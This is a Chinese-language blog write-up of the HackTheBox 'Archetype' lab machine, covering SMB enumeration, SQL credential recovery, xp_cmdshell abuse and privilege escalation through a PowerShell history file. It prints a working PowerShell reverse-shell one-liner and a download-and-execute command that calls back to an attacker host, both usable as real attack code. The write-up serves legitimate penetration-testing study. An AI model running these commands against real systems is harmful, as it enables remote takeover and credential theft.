---
title: HTB start point 1 - Archetype
date: 2021-07-27 16:28:36
tags:
- windows
categories:
- 渗透
- HTB
---


- [参考](https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea)解读官方文档
- [这篇文章](http://imin.red/2020-04-15-0x01-startingpoint-archetype/)详细讲述了思考过程
- [这篇文章](https://www.hackingarticles.in/smb-penetration-testing-port-445/)介绍了关于smb的渗透技巧，包括使用msf
- [MSSQL Penetration Testing with Metasploit](https://www.hackingarticles.in/mssql-penetration-testing-metasploit/)
- [SMB Penetration Testing (Port 445)](https://www.hackingarticles.in/smb-penetration-testing-port-445/)

## Enumeration

侦察阶段，根据[](!Linux-侦察清单)，收集开启的端口

```bash
 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 
 nmap -sC -sV -p$ports 10.10.10.27 
```

通过扫描可以发现`445`端口是开启的，服务是SQL Server。

根据[](!smb-渗透清单)

可能的漏洞为匿名用户登录

使用 `smbclient -L 10.10.10.27`发现

![](1611823952726.png)

其中有backups可能是突破点，使用 `smbclient //10.10.10.27/backups`进入smb共享文件，然后发现在目录下有`.dtsConfig`的文件。

> A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.

也就是SQLServer的配置文件。

使用`get <filename>`命令将文件拷贝到本地后打开发现，
![](1611824416119.png)

这个也就是数据库的用户。但是要考虑的是，这个用户可能是没有高级权限的。

## Foothold


要登录数据库，使用的是[impackets](https://github.com/SecureAuthCorp/impacket/tree/master/impacket)工具箱中的`mssqlclient.py` 工具。

`mssqlclint.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`

- 注意是`/`
- windows的验证 `-windows-auth`

当进入mssql之后，要确定权限。
- `select IS_SRVROLEMEMBER('sysadmin')`

确定权限后打开`xp_cmdshell`运行权限。 在mssqlclient.py中可以直接使用`enable_xp_cmdshell`一键开启

然后通过方向连接获得shell。

手册给出的手动解法是写一个getshell的文件，然后让目标机下载并执行。

所以这里就有4个点：
1. 要让目标机下载攻击机中的文件，需要在攻击机上开启下载端口，这里给出的方法是使用http的方式下载。
	- `python -m http.server 1633`
2. 目标机下载执行后需要与攻击机建立shell连接，所以需要另外一个监听端口。
	- `nc -nvlp 5711`
3. 攻击机上`shell.ps1`这个文件怎么写

```
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.32",5711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```
4. 目标机上如何下载并运行`shell.ps1`文件

```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.32:1633/shell.ps1\");""
```

这样就可以获得shell了。 那么还有没有其他的方法呢？ 后面讨论


## Privilege escalation

在本案例中，权限提升是通过找到目标机上的历史记录得到Administrator用户的。

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![](1611890465860.png)

`net use` 是将远端smb映射到本地上，并且通常会使用用户。

得到用户密码之后就是登录的操作了。

使用的工具是`psexec`

`psexec administrator@10.10.10.27`

flag 就在桌面目录上


## 后续

get shell 的工具：

1. MSF `exploit/windows/smb/psexec`
	- 使用[unicorn](https://github.com/trustedsec/unicorn)可以生成生成对应的shellcode
2. psexec
3. Winexe
4. smbexec.py
5. wmiexec.py
6. CrackMapExec
7. 

- [参考文章](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)